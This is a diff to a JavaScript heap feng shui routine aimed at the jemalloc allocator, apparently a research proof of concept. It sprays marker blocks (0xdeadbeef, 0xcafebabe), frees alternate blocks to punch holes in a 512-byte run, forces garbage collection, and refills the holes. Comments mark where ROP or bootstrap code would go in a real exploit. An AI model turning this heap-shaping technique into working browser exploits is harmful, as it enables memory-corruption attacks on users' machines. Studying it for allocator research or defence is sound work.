@@ -10,6 +10,7 @@ function jemalloc_feng_shui(blocks, size)
 
     var block_size = size / 2;
 
+    // construct the 0xdeadbeef blocks, in a real exploit this would be
     // rop/bootstrap/whatever
     var marker = unescape("%ubeef%udead");
     marker += marker;
@@ -24,6 +25,7 @@ function jemalloc_feng_shui(blocks, size)
 
     var arr = [];
 
+    // spray the 0xdeadbeef blocks
     for(i = 0; i < blocks; i++)
     {
         // construct the random block padding (corelanc0d3r's trick)
@@ -58,6 +60,19 @@ function jemalloc_feng_shui(blocks, size)
     // for debugging
     Math.asin(Math.random());
 
+    // free every other 0xdeadbeef block to create holes
+    // in the jemalloc 512 run
+    for(i = 0; i < blocks; i += 2)
+    {
+        delete(arr[i]);
+        arr[i] = null;
+    }
+
+    var ret = trigger_gc();
+ 
+    alert("After garbage collection: " + ret.length);
+
+    // construct the 0xcafebabe blocks
     marker = unescape("%ubabe%ucafe");
     marker += marker;
 
@@ -68,17 +83,8 @@ function jemalloc_feng_shui(blocks, size)
         content += content;
     }
 
-    for(i = 0; i < blocks; i += 2)
-    {
-        delete(arr[i]);
-        // arr.splice(i, 1);
-        arr[i] = null;
-    }
-
-    var ret = trigger_gc();
- 
-    alert("After garbage collection: " + ret.length);
-
+    // spray the 0xcafebabe blocks with the goal of filling
+    // the previously created holes on the 512 run
     for(i = 0; i < blocks; i += 2)
     {
         var rnd1 = Math.floor(Math.random() * 1000) % 16;
